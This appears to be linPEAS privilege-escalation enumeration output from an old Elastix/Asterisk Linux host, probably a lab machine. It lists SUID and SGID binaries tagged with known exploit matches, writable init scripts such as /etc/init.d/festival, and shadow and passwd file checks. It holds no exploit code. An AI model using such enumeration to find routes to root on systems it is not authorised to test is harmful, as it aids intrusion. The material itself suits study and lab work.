+═════════════════════════════════════════╣ Interesting Files ╠═════════════════════════════════════════                                                                                                                                                                                                                     
+                                         ╚═══════════════════╝                                                                                                                                                                                                                                                              
+╔══════════╣ SUID - Check easy privesc, exploits and write perms
+╚ https://book.hacktricks.xyz/linux-unix/privilege-escalation#sudo-and-suid                                                                                                                                                                                                                                                 
+-rws--x--x 1 root root 63K Jun 13  2011 /usr/bin/sperl5.8.8                                                                                                                                                                                                                                                                 
+-rwsr-xr-x 1 root root 44K May 25  2011 /usr/bin/gpasswd
+-rwsr-xr-x 1 root root 20K Aug 11  2010 /usr/bin/passwd  --->  Apple_Mac_OSX(03-2006)/Solaris_8/9(12-2004)/SPARC_8/9/Sun_Solaris_2.3_to_2.5.1(02-1997)
+---s--x--x 2 root root 171K Mar  6  2011 /usr/bin/sudo  --->  check_if_the_sudo_version_is_vulnerable
+-rws--x--x 1 root root 14K Mar 10  2011 /usr/bin/chsh
+-rwsr-sr-x 1 root root 303K Jan  6  2010 /usr/bin/crontab
+-rwsr-xr-x 1 root root 43K Jan 27  2010 /usr/bin/at  --->  RTru64_UNIX_4.0g(CVE-2002-1614)
+-rwsr-xr-x 1 root root 43K May 25  2011 /usr/bin/chage
+---s--x--x 2 root root 171K Mar  6  2011 /usr/bin/sudo  --->  check_if_the_sudo_version_is_vulnerableedit
+-rws--x--x 1 root root 15K Mar 10  2011 /usr/bin/chfn  --->  SuSE_9.3/10
+-rwsr-xr-x 1 root root 23K May 25  2011 /usr/bin/newgrp  --->  HP-UX_10.20
+-r-sr-xr-x 1 root root 14K Jul 16  2019 /usr/lib/vmware-tools/bin64/vmware-user-suid-wrapper
+-r-sr-xr-x 1 root root 9.4K Jul 16  2019 /usr/lib/vmware-tools/bin32/vmware-user-suid-wrapper
+-rws--x--x 1 vcsa root 5.8K Nov 11  2007 /usr/libexec/mc/cons.saver
+-rwsr-xr-x 1 root root 173K Apr 14  2011 /usr/libexec/openssh/ssh-keysign
+-rwsr-xr-x 1 root root 6.1K Jan  6  2007 /usr/sbin/ccreds_validate
+-rws--x--x 1 root root 29K Feb 27  2009 /usr/sbin/userhelper
+-r-s--x--- 1 root apache 12K May  4  2011 /usr/sbin/suexec
+-rwsr-xr-x 1 root root 6.8K Feb  1  2011 /usr/sbin/usernetctl
+-rwsr-xr-x 1 root root 166K Mar 30  2011 /usr/kerberos/bin/ksu
+-rwsr-xr-x 1 root root 52K Mar 10  2011 /bin/mount  --->  Apple_Mac_OSX(Lion)_Kernel_xnu-1699.32.7_except_xnu-1699.24.8
+-rwsr-xr-x 1 root root 33K Mar 10  2011 /bin/umount  --->  BSD/Linux(08-1996)
+-rwsr-xr-x 1 root root 24K Mar 30  2011 /bin/su
+-rwsr-xr-x 1 root root 35K Sep 26  2009 /bin/ping
+-rwsr-xr-x 1 root root 31K Sep 26  2009 /bin/ping6
+-rwsr-x--- 1 root dbus 42K Mar 31  2011 /lib/dbus-1/dbus-daemon-launch-helper
+-rwsr-xr-x 1 root root 13K Nov  1  2010 /sbin/pam_timestamp_check
+-rwsr-xr-x 1 root root 70K Mar  6  2011 /sbin/mount.nfs
+-rwsr-xr-x 1 root root 70K Mar  6  2011 /sbin/umount.nfs
+-rwsr-xr-x 1 root root 70K Mar  6  2011 /sbin/umount.nfs4
+-rwsr-xr-x 1 root root 70K Mar  6  2011 /sbin/mount.nfs4
+-rwsr-xr-x 1 root root 19K Nov  1  2010 /sbin/unix_chkpwd
+
+╔══════════╣ SGID
+╚ https://book.hacktricks.xyz/linux-unix/privilege-escalation#sudo-and-suid                                                                                                                                                                                                                                                 
+-r-xr-sr-x 1 root tty 8.0K Jan 21  2009 /usr/bin/wall                                                                                                                                                                                                                                                                       
+-rwxr-sr-x 1 root tty 8.9K Mar 10  2011 /usr/bin/write
+-rwsr-sr-x 1 root root 303K Jan  6  2010 /usr/bin/crontab
+-rwxr-sr-x 1 root mail 14K Mar 29  2007 /usr/bin/lockfile
+-rwxr-sr-x 1 root nobody 87K Apr 14  2011 /usr/bin/ssh-agent
+-rwxr-sr-x 1 root mailman 6.8K Mar 30  2011 /usr/lib/mailman/cgi-bin/rmlist (Unknown SGID binary)
+-rwxr-sr-x 1 root mailman 6.8K Mar 30  2011 /usr/lib/mailman/cgi-bin/edithtml (Unknown SGID binary)
+-rwxr-sr-x 1 root mailman 6.8K Mar 30  2011 /usr/lib/mailman/cgi-bin/create (Unknown SGID binary)
+-rwxr-sr-x 1 root mailman 6.8K Mar 30  2011 /usr/lib/mailman/cgi-bin/admindb (Unknown SGID binary)
+-rwxr-sr-x 1 root mailman 6.8K Mar 30  2011 /usr/lib/mailman/cgi-bin/options (Unknown SGID binary)
+-rwxr-sr-x 1 root mailman 6.8K Mar 30  2011 /usr/lib/mailman/cgi-bin/confirm (Unknown SGID binary)
+-rwxr-sr-x 1 root mailman 6.8K Mar 30  2011 /usr/lib/mailman/cgi-bin/roster (Unknown SGID binary)
+-rwxr-sr-x 1 root mailman 6.8K Mar 30  2011 /usr/lib/mailman/cgi-bin/listinfo (Unknown SGID binary)
+-rwxr-sr-x 1 root mailman 6.8K Mar 30  2011 /usr/lib/mailman/cgi-bin/private (Unknown SGID binary)
+-rwxr-sr-x 1 root mailman 6.8K Mar 30  2011 /usr/lib/mailman/cgi-bin/admin (Unknown SGID binary)
+-rwxr-sr-x 1 root mailman 6.8K Mar 30  2011 /usr/lib/mailman/cgi-bin/subscribe (Unknown SGID binary)
+-rwxr-sr-x 1 root mailman 7.2K Mar 30  2011 /usr/lib/mailman/mail/mailman (Unknown SGID binary)
+-rwx--s--x 1 root utmp 4.6K Feb 27  2009 /usr/libexec/utempter/utempter
+-rwxr-sr-x 1 root lock 11K Jan  9  2007 /usr/sbin/lockdev
+-rwxr-sr-x 1 root postdrop 173K May 31  2011 /usr/sbin/postqueue
+-rwxr-sr-x 1 root postdrop 157K May 31  2011 /usr/sbin/postdrop
+-rwxr-sr-x 1 root root 4.0K Feb  1  2011 /sbin/netreport
+
+╔══════════╣ Checking misconfigurations of ld.so
+╚ https://book.hacktricks.xyz/linux-unix/privilege-escalation#ld-so                                                                                                                                                                                                                                                         
+/etc/ld.so.conf                                                                                                                                                                                                                                                                                                             
+include ld.so.conf.d/*.conf
+ld.so.conf.d
+  ld.so.conf.d/*
+cat: ld.so.conf.d/*: No such file or directory
+
+╔══════════╣ Capabilities
+╚ https://book.hacktricks.xyz/linux-unix/privilege-escalation#capabilities                                                                                                                                                                                                                                                  
+Current capabilities:                                                                                                                                                                                                                                                                                                       
+CapInh: 0000000000000000
+CapPrm: 0000000000000000
+CapEff: 0000000000000000
+
+Shell capabilities:
+capsh Not Found
+CapInh: 0000000000000000                                                                                                                                                                                                                                                                                                    
+CapPrm: 0000000000000000
+CapEff: 0000000000000000
+
+Files with capabilities (limited to 50):
+
+╔══════════╣ Files with ACLs (limited to 50)
+╚ https://book.hacktricks.xyz/linux-unix/privilege-escalation#acls                                                                                                                                                                                                                                                          
+files with acls in searched folders Not Found                                                                                                                                                                                                                                                                               
+                                                                                                                                                                                                                                                                                                                            
+╔══════════╣ .sh files in path
+╚ https://book.hacktricks.xyz/linux-unix/privilege-escalation#script-binaries-in-path                                                                                                                                                                                                                                       
+/usr/bin/lesspipe.sh                                                                                                                                                                                                                                                                                                        
+/usr/bin/pv.sh
+/usr/bin/unix-lpr.sh
+/usr/bin/lprsetup.sh
+/usr/bin/versionPaquetes.sh
+/usr/local/sbin/motd.sh
+/usr/local/bin/spamfilter.sh
+
+╔══════════╣ Unexpected in root
+/selinux                                                                                                                                                                                                                                                                                                                    
+/.autofsck
+/.autorelabel
+/tftpboot
+
+╔══════════╣ Files (scripts) in /etc/profile.d/
+╚ https://book.hacktricks.xyz/linux-unix/privilege-escalation#profiles-files                                                                                                                                                                                                                                                
+total 136                                                                                                                                                                                                                                                                                                                   
+drwxr-xr-x  2 root root 4096 Apr  7  2017 .
+drwxr-xr-x 78 root root 4096 Dec 24 10:48 ..
+-rwxr-xr-x  1 root root  764 Mar 30  2011 colorls.csh
+-rwxr-xr-x  1 root root  725 Mar 30  2011 colorls.sh
+-rwxr-xr-x  1 root root  192 Mar 25  2009 glib2.csh
+-rwxr-xr-x  1 root root  192 Mar 25  2009 glib2.sh
+-rw-r--r--  1 root root  218 Sep  9  2004 krb5-workstation.csh
+-rw-r--r--  1 root root  229 Jan 19  2006 krb5-workstation.sh
+-rwxr-xr-x  1 root root 2959 Feb  1  2011 lang.csh
+-rwxr-xr-x  1 root root 3234 Feb  1  2011 lang.sh
+-rwxr-xr-x  1 root root  122 Jan 21  2011 less.csh
+-rwxr-xr-x  1 root root  108 Jan 21  2011 less.sh
+-rwxr-xr-x  1 root root   51 Nov 11  2007 mc.csh
+-rwxr-xr-x  1 root root   45 Nov 11  2007 mc.sh
+-rwxr-xr-x  1 root root   97 Mar  6  2011 vim.csh
+-rwxr-xr-x  1 root root  293 Mar  6  2011 vim.sh
+-rwxr-xr-x  1 root root  170 Jan  7  2007 which-2.sh
+
+╔══════════╣ Permissions in init, init.d, systemd, and rc.d
+╚ https://book.hacktricks.xyz/linux-unix/privilege-escalation#init-init-d-systemd-and-rc-d                                                                                                                                                                                                                                  
+You have write privileges over /etc/init.d/festival                                                                                                                                                                                                                                                                         
+/etc/init.d/elastix-updaterd
+The following files aren't owned by root: /etc/init.d/openfire
+/etc/init.d/festival
+/etc/init.d/elastix-updaterd
+You have write privileges over /etc/rc.d/init.d/festival
+/etc/rc.d/init.d/elastix-updaterd
+The following files aren't owned by root: /etc/rc.d/init.d/openfire
+/etc/rc.d/init.d/festival
+/etc/rc.d/init.d/elastix-updaterd
+You have write privileges over /etc/rc.d/init.d/festival
+/etc/rc.d/init.d/elastix-updaterd
+The following files aren't owned by root: /etc/rc.d/init.d/openfire
+/etc/rc.d/init.d/festival
+/etc/rc.d/init.d/elastix-updaterd
+
+═╣ Hashes inside passwd file? ........... No
+═╣ Writable passwd file? ................ No                                                                                                                                                                                                                                                                                
+═╣ Credentials in fstab/mtab? ........... No                                                                                                                                                                                                                                                                                
+═╣ Can I read shadow files? ............. No                                                                                                                                                                                                                                                                                
+═╣ Can I read shadow plists? ............ No                                                                                                                                                                                                                                                                                
+═╣ Can I write shadow plists? ........... No                                                                                                                                                                                                                                                                                
+═╣ Can I read opasswd file? ............. No                                                                                                                                                                                                                                                                                
+═╣ Can I write in network-scripts? ...... No                                                                                                                                                                                                                                                                                
+═╣ Can I read root folder? .............. No                                                                                                                                                                                                                                                                                
+                                                                                                                                                                                                                                                                                                                            
+╔══════════╣ Searching root files in home dirs (limit 30)
+/home/                                                                                                                                                                                                                                                                                                                      
+/root/
+/var/lib/asterisk/sounds/phonetic
+
+╔══════════╣ Searching folders owned by me containing others files on it (limit 100)
+/var/lib/asterisk/sounds                                                                                                                                                                                                                                                                                                    
+
+╔══════════╣ Readable files belonging to root and readable by me but not world readable
+-rw-rw---- 1 root asterisk 2266 May 12  2009 /var/spool/hylafax/etc/#sample.config.ttyIAX                                                                                                                                                                                                                                   
+-rw-rw---- 1 root asterisk 178 May 12  2009 /etc/iaxmodem/#sample.iaxmodem-cfg.ttyIAX
+
+╔══════════╣ Modified interesting files in the last 5mins (limit 100)
+                                                                                                                                                                                                                                                                                                                            
+╔══════════╣ Writable log files (logrotten) (limit 100)
+╚ https://book.hacktricks.xyz/linux-unix/privilege-escalation#logrotate-exploitation                                                                                                                                                                                                                                        
+logrotate Not Found                                                                                                                                                                                                                                                                                                         
+Writable folder: /tmp/ks-script-_a_xql.log                                                                                                                                                                                                                                                                                  
+Writable folder: /tmp/imap_stickgate.log
